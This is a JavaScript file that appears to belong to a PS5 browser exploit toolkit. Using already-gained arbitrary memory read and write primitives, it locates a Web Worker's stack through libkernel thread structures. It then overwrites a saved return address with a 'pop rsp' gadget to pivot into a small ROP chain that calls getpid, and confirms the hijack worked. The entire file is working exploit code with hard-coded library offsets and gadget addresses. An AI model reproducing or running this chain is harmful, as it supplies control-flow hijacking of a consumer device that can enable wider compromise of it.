// worker_ret_1340.js — chain [getpid, ORIG_RET]: ONE unverified address (pop rsp).
// getpid stub proven via nativeCall. ORIG_RET read live from slot.
// Misery: pop rsp wrong => instant silence. Works => worker resumes + ANSWER2.
(async () => {
  const say = async (s) => { try { await log("[wret] " + s); } catch(e){} };
  const hx = (v) => { try { return "0x" + (BigInt(v) & 0xFFFFFFFFFFFFFFFFn).toString(16); } catch(e){ return "?"; } };
  const WK = BigInt(PS5.webkitBase||0), LK = BigInt(PS5.libkernelBase||0);
  let PRSP = 0xA1138;
  try{
    const q = new URLSearchParams(location.search).get("prsp");
    if(q) PRSP = parseInt(q, 16);
  }catch(e){}
  let worker = null;
  try{
    worker = new Worker("payloads/worker_slave.js");
    await Promise.race([new Promise((res)=>{worker.onmessage=()=>res(1);worker.postMessage(0);}),
      new Promise((_,rej)=>setTimeout(()=>rej(new Error("t/o")),5000))]);
  }catch(e){ await say("ABORT handshake"); return; }
  let wstack = 0n;
  for(const h of [0x64218,0x6C218]){
    try{ let t=read64(LK+BigInt(h));
      for(let i=0;i<64&&t!==0n;i++){ if(read64(t+0xB0n)===0x80000n){ wstack=read64(t+0xA8n); break; } t=read64(t+0x38n); }
    }catch(e){}
    if(wstack) break;
  }
  const EXP = LK+0x1FD01n;
  let retslot = 0n, cnt = 0;
  try{ for(let o=0x7F000n;o<0x80000n;o+=8n){ if(read64(wstack+o)===EXP){ cnt++; if(!retslot) retslot=wstack+o; } } }catch(e){}
  if(cnt!==1){ await say("ABORT retfp="+cnt); return; }
  const cbase = malloc(0x1000);
  let entry = cbase+0x100n;
  if(entry&8n) entry += 8n;
  const orig_ret = read64(retslot), orig_sp = read64(retslot+8n);
  write64(entry, LK+0x1B860n);
  write64(entry+8n, orig_ret);
  write64(retslot, WK+BigInt(PRSP));
  write64(retslot+8n, entry);
  await say("fired prsp=0x"+PRSP.toString(16)+" (only unverified addr in play)");
  worker.onmessage = () => { try{ log("[wret] msg1 (pre-hijack echo)"); }catch(e){} };
  worker.postMessage(0);
  await new Promise((r)=>setTimeout(r,700));
  worker.onmessage = () => { try{ log("[wret] ANSWER2 => CHAIN RAN AND WORKER SURVIVED"); }catch(e){} };
  try{ worker.postMessage(0); }catch(e){}
  await new Promise((r)=>setTimeout(r,1500));
  await say("probe2 over");
  try{ send_notification("wret done"); }catch(e){}
})();
